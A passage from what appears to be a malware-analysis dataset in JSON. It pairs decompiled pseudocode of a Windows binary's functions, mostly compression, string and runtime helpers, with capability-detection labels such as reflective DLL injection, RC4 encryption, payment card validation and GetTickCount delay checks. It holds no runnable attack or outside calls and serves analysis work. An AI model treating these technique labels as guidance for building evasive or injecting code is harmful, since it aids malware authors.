*(arg_8h + 6) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 7) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 8) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 9) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 10) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0xb) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0xc) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0xd) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0xe) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0xf) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x10) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x11) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x12) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x13) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x14) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x15) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x16) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x17) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x18) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | (*(arg_8h + 0x18) >> 8) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x1c) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | (*(arg_8h + 0x1c) >> 8) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    iVar3 = (*pcVar1)(uVar2, arg_8h + 0x148, *(arg_8h + 0x18));\n    if (iVar3 != *(arg_8h + 0x18)) {\n        return 10;\n    }\n    if ((*(arg_8h + 0x1c) != 0) &&\n       (iVar3 = (*pcVar1)(uVar2, *(arg_8h + 0x13c), *(arg_8h + 0x1c)),  iVar3 != *(arg_8h + 0x1c))) {\n        return 10;\n    }\n    return 0;\n}\n",
        "token_count": 1591
    },
    "004265f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.004265f0(int32_t arg_8h, code *arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint var_1h;\n    \n    uVar2 = arg_10h;\n    pcVar1 = arg_ch;\n    (*arg_ch)(arg_10h, &var_1h, 1);\n    (*pcVar1)(uVar2, &var_1h, 1);\n    arg_ch = CONCAT13(7, arg_ch._0_3_);\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = CONCAT13(8, arg_ch._0_3_);\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0xc) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0xd) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0xe) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0xf) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x10) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x11) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x12) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x13) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x14) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x15) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x16) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *(arg_8h + 0x17) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    return 0;\n}\n",
        "token_count": 774
    },
    "00426710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "enumerate PE sections"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00426710(uint8_t *arg_8h, code *arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_1h;\n    \n    uVar2 = arg_10h;\n    pcVar1 = arg_ch;\n    (*arg_ch)(arg_10h, &var_1h, 1);\n    (*pcVar1)(uVar2, &var_1h, 1);\n    arg_ch = CONCAT13(1, arg_ch._0_3_);\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = CONCAT13(2, arg_ch._0_3_);\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | *arg_8h << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[1] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[2] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[3] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[4] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[5] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[6] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[7] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[8] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[9] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[10] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0xb] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0xc] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0xd] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0xe] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0xf] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x10] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x11] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x12] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x13] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x14] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x15] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x16] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x17] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x18] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | (*(arg_8h + 0x18) >> 8) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x20] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | (*(arg_8h + 0x20) >> 8) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x24] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | (*(arg_8h + 0x24) >> 8) << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x28] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x29] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x2a] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x2b] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x30] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x31] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x32] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x33] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x34] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x35] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x36] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | arg_8h[0x37] << 0x18;\n    (*pcVar1)(uVar2, &arg_ch + 3, 1);\n    iVar3 = (*pcVar1)(uVar2, arg_8h + 0x148, *(arg_8h + 0x18));\n    if (iVar3 != *(arg_8h + 0x18)) {\n        return 10;\n    }\n    if ((*(arg_8h + 0x20) != 0) &&\n       (iVar3 = (*pcVar1)(uVar2, *(arg_8h + 0x140), *(arg_8h + 0x20)),  iVar3 != *(arg_8h + 0x20))) {\n        return 10;\n    }\n    if ((*(arg_8h + 0x24) != 0) &&\n       (iVar3 = (*pcVar1)(uVar2, *(arg_8h + 0x144), *(arg_8h + 0x24)),  iVar3 != *(arg_8h + 0x24))) {\n        return 10;\n    }\n    return 0;\n}\n",
        "token_count": 2347
    },
    "004270f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004270f0(char *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_ECX;\n    \n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    *(in_ECX + 2) = 0;\n    in_ECX[3] = 0;\n    in_ECX[4] = 0;\n    in_ECX[5] = 0;\n    in_ECX[6] = 0;\n    in_ECX[8] = 0;\n    *(in_ECX + 0xb) = 0;\n    in_ECX[0xf] = 0;\n    in_ECX[0x11] = 0;\n    in_ECX[0x12] = 0;\n    in_ECX[0x1f] = 0;\n    if ((arg_8h != NULL) && (*arg_8h != '\\0')) {\n        iVar1 = (**0x462f30)(arg_8h);\n        uVar2 = fcn.0042b2b1(iVar1 + 1);\n        *in_ECX = uVar2;\n        (**0x4630e4)(uVar2, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 286
    },
    "00427810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00427810(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint32_t arg_10h;\n    \n    if (*(in_ECX + 0x84) == 0) {\n        if (*(in_ECX + 0x7c) == 0) {\n            *(in_ECX + 0x14) = 0x1000000;\n        }\n        else {\n            iVar3 = (**0x462ff4)(*(in_ECX + 0x7c), arg_8h, arg_ch, &arg_ch, 0);\n            uVar1 = arg_ch;\n            if (iVar3 != 0) {\n                *(in_ECX + 0x74) = *(in_ECX + 0x74) + arg_ch;\n                uVar2 = fcn.00426c00(*(in_ECX + 0x78), arg_8h, arg_ch);\n                *(in_ECX + 0x78) = uVar2;\n                return uVar1;\n            }\n        }\n    }\n    else {\n        uVar1 = *(in_ECX + 0x8c);\n        if (uVar1 < *(in_ECX + 0x88)) {\n            arg_10h = *(in_ECX + 0x88) - uVar1;\n            if (arg_ch < arg_10h) {\n                arg_10h = arg_ch;\n            }\n            fcn.0042a840(arg_8h, uVar1 + *(in_ECX + 0x84), arg_10h);\n            *(in_ECX + 0x8c) = *(in_ECX + 0x8c) + arg_10h;\n            *(in_ECX + 0x74) = *(in_ECX + 0x74) + arg_10h;\n            uVar2 = fcn.00426c00(*(in_ECX + 0x78), arg_8h, arg_10h);\n            *(in_ECX + 0x78) = uVar2;\n            return arg_10h;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 498
    },
    "00427ed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427ed0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    \n    fcn.00425e40(arg_8h, arg_ch + -0x101, 5);\n    fcn.00425e40(arg_8h, arg_10h + -1, 5);\n    fcn.00425e40(arg_8h, arg_14h + -4, 4);\n    iVar1 = 0;\n    if (0 < arg_14h) {\n        do {\n            fcn.00425e40(arg_8h, *(arg_8h + 0xef6 + *(iVar1 + 0x448124) * 4), 3);\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < arg_14h);\n    }\n    fcn.00427c90(arg_8h, arg_8h + 0x14, arg_ch + -1);\n    fcn.00427c90(arg_8h, arg_8h + 0x908, arg_10h + -1);\n    return;\n}\n",
        "token_count": 272
    },
    "004283d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004283d0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f39b;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    iVar1 = fcn.0042b2b1(0x4098);\n    var_4h = 0;\n    if (iVar1 == 0) {\n        piVar2 = NULL;\n    }\n    else {\n        piVar2 = fcn.004270f0(arg_14h);\n    }\n    var_4h = 0xffffffff;\n    *0x46316c = fcn.00427150(arg_8h, arg_ch, arg_10h);\n    if (*0x46316c != 0) {\n        if (piVar2 != NULL) {\n            if (piVar2[0x12] != 0) {\n                fcn.0042a679(piVar2[0x12]);\n            }\n            piVar2[0x12] = 0;\n            if (piVar2[0xf] != 0) {\n                fcn.0042a679(piVar2[0xf]);\n            }\n            piVar2[0xf] = 0;\n            if (*piVar2 != 0) {\n                fcn.0042a679(*piVar2);\n            }\n            *piVar2 = 0;\n            fcn.0042a679(piVar2);\n        }\n        *in_FS_OFFSET = var_ch;\n        return NULL;\n    }\n    puVar3 = fcn.0042b2b1(8);\n    *puVar3 = 2;\n    puVar3[1] = piVar2;\n    *in_FS_OFFSET = var_ch;\n    return puVar3;\n}\n",
        "token_count": 475
    },
    "004284d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004284d0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.004283d0(arg_8h, arg_ch, 3, arg_10h);\n    return;\n}\n",
        "token_count": 56
    },
    "00428f40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00428f40(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x48) == 0) {\n        iVar1 = fcn.0042b2b1(0x6afa8);\n        if (iVar1 == 0) {\n            iVar1 = 0;\n        }\n        else {\n            fcn.00425690();\n            *(iVar1 + 0x6af70) = 0;\n        }\n        *(in_ECX + 0x48) = iVar1;\n    }\n    *(*(in_ECX + 0x48) + 0x6afa4) = 0;\n    *(*(in_ECX + 0x48) + 0xc) = 0x4276e0;\n    *(*(in_ECX + 0x48) + 0x10) = 0x4275f0;\n    **(in_ECX + 0x48) = in_ECX;\n    *(*(in_ECX + 0x48) + 4) = 8;\n    *(*(in_ECX + 0x48) + 8) = *(in_ECX + 0x6c);\n    *(*(in_ECX + 0x48) + 0x6afa4) = 0;\n    *(*(in_ECX + 0x48) + 0xe7e) = 0;\n    *(*(in_ECX + 0x48) + 0x6af70) = 0;\n    iVar1 = *(in_ECX + 0x48);\n    *(iVar1 + 0x1af60) = in_ECX + 0x94;\n    *(iVar1 + 0x1af68) = 0x4000;\n    *(iVar1 + 0x1af64) = 0;\n    *(iVar1 + 0x1af54) = 1;\n    *(iVar1 + 0x1af58) = 0;\n    *(iVar1 + 0x1af5c) = 0;\n    *(iVar1 + 0x1af6c) = 0;\n    fcn.004284f0(*(in_ECX + 0x48), arg_8h + 0x2a);\n    fcn.004280c0(*(in_ECX + 0x48), *(*(in_ECX + 0x48) + 4), arg_8h + 4);\n    uVar2 = fcn.00428bd0(*(in_ECX + 0x48));\n    *(in_ECX + 0x90) = uVar2;\n    uVar2 = 0;\n    if (*(*(in_ECX + 0x48) + 0x6afa4) != 0) {\n        uVar2 = 0x5000000;\n    }\n    return uVar2;\n}\n",
        "token_count": 657
    },
    "0042a49c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042a49c(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    fcn.0042fe78(arg_8h, *(arg_ch * 4 + 0x448788), arg_10h);\n    return;\n}\n",
        "token_count": 66
    },
    "0042bb40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.0042bb40(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar4 = param_1 & 3;\n    puVar3 = param_1;\n    while (uVar4 != 0) {\n        uVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        if (uVar1 == 0) goto code_r0x0042bb93;\n        uVar4 = puVar3 & 3;\n    }\n    do {\n        do {\n            puVar5 = puVar3;\n            puVar3 = puVar5 + 1;\n        } while (((*puVar5 ^ 0xffffffff ^ *puVar5 + 0x7efefeff) & 0x81010100) == 0);\n        uVar4 = *puVar5;\n        if (uVar4 == '\\0') goto code_r0x0042bba5;\n        if (uVar4 >> 8 == '\\0') {\n            puVar5 = puVar5 + 1;\n            goto code_r0x0042bba5;\n        }\n        if ((uVar4 & 0xff0000) == 0) {\n            puVar5 = puVar5 + 2;\n            goto code_r0x0042bba5;\n        }\n    } while ((uVar4 & 0xff000000) != 0);\ncode_r0x0042bb93:\n    puVar5 = puVar3 + -1;\ncode_r0x0042bba5:\n    uVar4 = param_2 & 3;\n    while (uVar4 != 0) {\n        uVar1 = *param_2;\n        uVar4 = uVar1;\n        param_2 = param_2 + 1;\n        if (uVar1 == 0) goto code_r0x0042bc20;\n        *puVar5 = uVar1;\n        puVar5 = puVar5 + 1;\n        uVar4 = param_2 & 3;\n    }\n    do {\n        uVar2 = *param_2;\n        uVar4 = *param_2;\n        param_2 = param_2 + 1;\n        if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {\n            if (uVar4 == '\\0') {\ncode_r0x0042bc20:\n                *puVar5 = uVar4;\n                return param_1;\n            }\n            if (uVar4 >> 8 == '\\0') {\n                *puVar5 = uVar4;\n                return param_1;\n            }\n            if ((uVar4 & 0xff0000) == 0) {\n                *puVar5 = uVar4;\n                *(puVar5 + 2) = 0;\n                return param_1;\n            }\n            if ((uVar4 & 0xff000000) == 0) {\n                *puVar5 = uVar4;\n                return param_1;\n            }\n        }\n        *puVar5 = uVar4;\n        puVar5 = puVar5 + 1;\n    } while( true );\n}\n",
        "token_count": 756
    },
    "0042bb30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.0042bb30(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    \n    uVar3 = param_2 & 3;\n    puVar4 = param_1;\n    while (uVar3 != 0) {\n        uVar1 = *param_2;\n        uVar3 = uVar1;\n        param_2 = param_2 + 1;\n        if (uVar1 == 0) goto code_r0x0042bc20;\n        *puVar4 = uVar1;\n        puVar4 = puVar4 + 1;\n        uVar3 = param_2 & 3;\n    }\n    do {\n        uVar2 = *param_2;\n        uVar3 = *param_2;\n        param_2 = param_2 + 1;\n        if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {\n            if (uVar3 == '\\0') {\ncode_r0x0042bc20:\n                *puVar4 = uVar3;\n                return param_1;\n            }\n            if (uVar3 >> 8 == '\\0') {\n                *puVar4 = uVar3;\n                return param_1;\n            }\n            if ((uVar3 & 0xff0000) == 0) {\n                *puVar4 = uVar3;\n                *(puVar4 + 2) = 0;\n                return param_1;\n            }\n            if ((uVar3 & 0xff000000) == 0) {\n                *puVar4 = uVar3;\n                return param_1;\n            }\n        }\n        *puVar4 = uVar3;\n        puVar4 = puVar4 + 1;\n    } while( true );\n}\n",
        "token_count": 439
    },
    "004313ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004313ae(uint arg_8h)\n\n{\n    fcn.0043126e(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 40
    },
    "00436886": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0043689a)\n// WARNING: Removing unreachable block (ram,0x004368a0)\n// WARNING: Removing unreachable block (ram,0x004368a2)\n\nvoid fcn.00436886(void)\n\n{\n    return;\n}\n",
        "token_count": 63
    },
    "0043ba0f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0043ba0f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00433b40(0x44eae8, 0x14);\n    *(unaff_EBP + -0x1c) = 0;\n    puVar1 = *(unaff_EBP + 0x18);\n    if (((puVar1 == NULL) || (*puVar1 = 0xffffffff,  *(unaff_EBP + 8) == 0)) ||\n       ((*(unaff_EBP + 0x1c) != 0 && ((*(unaff_EBP + 0x14) & 0xfffffe7f) != 0)))) {\n        puVar1 = fcn.0043007c();\n        *puVar1 = 0x16;\n        fcn.00431906();\n    }\n    else {\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.0043b2db(unaff_EBP + -0x1c, *(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), \n                             *(unaff_EBP + 0x14));\n        *(unaff_EBP + -0x20) = uVar2;\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.0043baa5();\n        if (*(unaff_EBP + -0x20) != 0) {\n            *puVar1 = 0xffffffff;\n        }\n    }\n    fcn.00433b85();\n    return;\n}\n",
        "token_count": 444
    },
    "0043bad3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043bad3(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.0043ba0f(arg_ch, arg_10h, arg_14h, arg_18h, arg_8h, 1);\n    return;\n}\n",
        "token_count": 79
    },
    "004064e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.004064e0(uchar *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    if ((*(arg_ch + 0x14) - *(arg_ch + 0x10) < *(arg_10h + 0x10)) &&\n       (*(arg_ch + 0x10) <= *(arg_10h + 0x14) - *(arg_10h + 0x10))) {\n        arg_8h_00 = fcn.00405ee0(0, arg_ch, 0, 0xffffffff);\n    }\n    else {\n        arg_8h_00 = fcn.00405df0(arg_10h, 0, 0xffffffff);\n    }\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    fcn.004063e0(arg_8h_00);\n    return arg_8h;\n}\n",
        "token_count": 250
    },
    "0040bc50": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
